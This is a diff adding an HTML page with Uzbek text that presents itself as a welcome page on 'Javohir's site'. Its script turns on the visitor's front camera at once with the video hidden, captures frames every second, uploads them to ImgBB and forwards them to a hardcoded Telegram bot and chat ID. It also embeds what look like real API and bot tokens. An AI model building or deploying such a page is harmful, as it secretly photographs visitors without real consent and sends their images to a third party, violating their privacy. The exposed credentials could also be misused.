@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kamera bilan Rasm olish</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        video {
+            display: none; /* Kamerani saytga kirganda ko'rsatilmasin */
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            transform: scaleX(-1); /* Selfi effekti uchun oynani teskari qiladi */
+        }
+        canvas {
+            display: none;
+        }
+
+        .box {
+            background: linear-gradient(to right, #87CEEB, #1E3A8A);
+            padding: 10px 20px;
+            border-radius: 10px;
+        }
+
+        .box div {
+            background-color: white;
+            margin: 5px 0;
+            padding: 10px;
+            border-radius: 10px;
+        }
+    </style>
+</head>
+<body>
+    <video id="video" autoplay></video>
+    <div class="box">
+        <img src="/rasm.png" alt="rushana">
+        <div>Hush kelibsiz, Javohirning saytiga</div>
+        <div>Sizning rasmingiz menga yuborildi</div>
+    </div>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const imgbbApiKey = 'f9514c6a9c39fb1976f1065498c32b4a';
+        const telegramBotToken = '7607588308:AAHuS9GeQH1w-c1iisGbcrR5OXrj_Lbkkmo';
+        const chatId = '7761304842';
+        let photoCount = 0;
+        const maxPhotos = 2; // Maksimal 2 marotaba yuboriladi
+
+        // Selfi rejimida kamerani yoqish
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }).then(stream => {
+            video.srcObject = stream;
+        }).catch(err => console.error('Kamera xatoligi:', err));
+
+        // Har 1 sekundda rasmga olish va yuklash
+        const interval = setInterval(() => {
+            if (photoCount >= maxPhotos) {
+                clearInterval(interval); // Agar 5 marta yuborilgan bo'lsa, to'xtatadi
+                console.log('Rasmlar yuborish tamom.');
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.save();
+            context.scale(-1, 1); // Selfi uchun teskari qilib beradi
+            context.drawImage(video, -video.videoWidth, 0);
+            context.restore();
+            const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
+
+            // ImgBB ga yuklash
+            fetch('https://api.imgbb.com/1/upload?key=' + imgbbApiKey, {
+                method: 'POST',
+                body: new URLSearchParams({ image: imageData })
+            })
+            .then(response => response.json())
+            .then(data => {
+                const imageUrl = data.data.url;
+                console.log('Rasm yuklandi:', imageUrl);
+
+                // Telegram botga yuborish
+                fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, photo: imageUrl })
+                }).then(res => res.json()).then(result => {
+                    console.log('Telegramga yuborildi:', result);
+                    photoCount++; // Yuborilgan rasmlar sonini oshiradi
+                }).catch(err => console.error('Telegram xatoligi:', err));
+            })
+            .catch(err => console.error('ImgBB xatoligi:', err));
+
+        }, 1000);
+    </script>
+</body>
+</html>
+
